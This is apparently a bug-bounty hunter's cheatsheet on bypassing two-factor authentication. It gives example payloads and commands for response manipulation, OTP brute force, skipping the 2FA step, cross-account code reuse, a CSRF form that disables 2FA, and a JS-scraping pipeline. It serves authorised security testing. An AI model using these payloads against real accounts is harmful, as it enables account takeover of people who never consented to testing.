---
tags: [bugbounty, bypass/2fa, bypass/mfa, cheatsheet, p1, p2]
aliases: [2FA Bypass, MFA Bypass, Two-Factor Bypass]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Bypass 2FA / MFA

> [!tldr] Hunter Summary
> **What:** Circumvent two-factor authentication checks via logic flaws, response manipulation, or flow skipping.
> **Impact:** ATO without victim's phone/authenticator. P1 on most programs.
> **Best targets:** Login flows with OTP, TOTP apps, SMS codes, email codes.
> **Time to triage:** Walk through login flow in Burp, test each step.

---

## Step-by-Step Hunt

### Step 1 — Response manipulation
Change the 2FA check response:
```
# Server returns {"code": false}
# Intercept response, change to:
{"code": true}

# Or change status code:
HTTP/1.1 404 Not Found → HTTP/1.1 200 OK
```

### Step 2 — Code in response leak
```bash
# Send 2FA request, inspect the response carefully
POST /request-2fa
email=victim@gmail.com

# Sometimes response contains:
{"email": "victim@gmail.com", "code": "101010"}
# Read the code from the response itself
```

### Step 3 — Brute force OTP
6-digit TOTP: 000000–999999. Test if rate limiting exists:
```bash
# Burp Intruder with number list 000000–999999
# Check: does request fail after N attempts?
# Check: does it lock out?
# Check: is there a time window?

# Try with Turbo Intruder for speed
# Try across multiple sessions (distributed brute force)
```

### Step 4 — Missing integrity validation
Use one account's valid OTP code for another account:
```
# Get a valid 2FA code for attacker@gmail.com
POST /2fa/  code=382923  (generated for attacker)

# Try it on victim:
POST /2fa/
email=victim@gmail.com&code=382923
# If code is accepted: missing user binding
```

### Step 5 — Skip 2FA by direct navigation
After first step (password accepted), skip the 2FA step:
```
# Normal flow: /login → /2fa → /dashboard
# Try jumping directly to /dashboard after /login
# Try: /account/settings, /api/user/profile (may return data before 2FA complete)
```

### Step 6 — Use backup codes
- Many apps generate backup codes — check if backup code endpoint has rate limiting
- Test: backup code endpoint may have different (weaker) validation

### Step 7 — No CSRF on 2FA disable
```html
<form action="https://target.com/settings/2fa/disable" method="POST">
  <input type="hidden" name="confirm" value="true"/>
</form>
```

### Step 8 — Session persistence after 2FA enable
If victim has existing session before enabling 2FA:
```
# Enable 2FA on Account A (attacker controls this)
# Old session tokens created before 2FA enabled — do they still work?
# If yes: session timeout not reset on 2FA enable
```

### Step 9 — Code reuse
```
# Use the same 6-digit code twice
POST /2fa/  code=123456
# → success
POST /2fa/  code=123456  (same code again)
# Should fail — does it?
```

### Step 10 — Edge case codes
```
POST /2fa/  code=000000
POST /2fa/  code=null
POST /2fa/  code=
POST /2fa/  code=0
POST /2fa/  code=false
POST /2fa/  code[]=123456
```

### Step 11 — JS file hints
Check for 2FA code in JavaScript files:
```bash
# Search JS for hardcoded OTP or test codes
gau target.com | grep "\.js$" | httpx -mc 200 | xargs -I{} curl -s {} | grep -E "otp|2fa|code|token"
```

### Step 12 — Password change disables 2FA
Test: change password → does 2FA get disabled automatically?

---

## 2025-2026 Updates

> [!info] New 2FA bypass surface (2025-2026)
> - **Passkey downgrade:** Apps migrating to passkeys may fall back to SMS/TOTP — test if you can force downgrade
> - **SIM swap + SMS:** If the program covers SIM swap attack impact, that's in scope
> - **Push notification MFA fatigue:** If app uses push notification 2FA — report as MFA fatigue attack vector (P3, but notable)
> - **OAuth 2FA bypass:** Login via SSO often skips app-level 2FA entirely
> - **Magic link bypass:** Apps with "login via magic link" email — 2FA sometimes skipped for magic link logins

---

## Chain Ideas

| 2FA bypass → | Result |
|-------------|--------|
| Response manipulation | → Login as any user without their OTP |
| Skip 2FA step | → Full ATO |
| CSRF on 2FA disable | → Remove victim's MFA → ATO via password |
| Code in response | → Login as victim |
| Brute force OTP | → ATO (if no rate limit) |

---

## References

- @harshbothra_ 2FA bypass techniques (Twitter)
- PortSwigger Authentication attacks — https://portswigger.net/web-security/authentication
- HackTricks 2FA bypass — https://book.hacktricks.xyz/pentesting-web/2fa-bypass
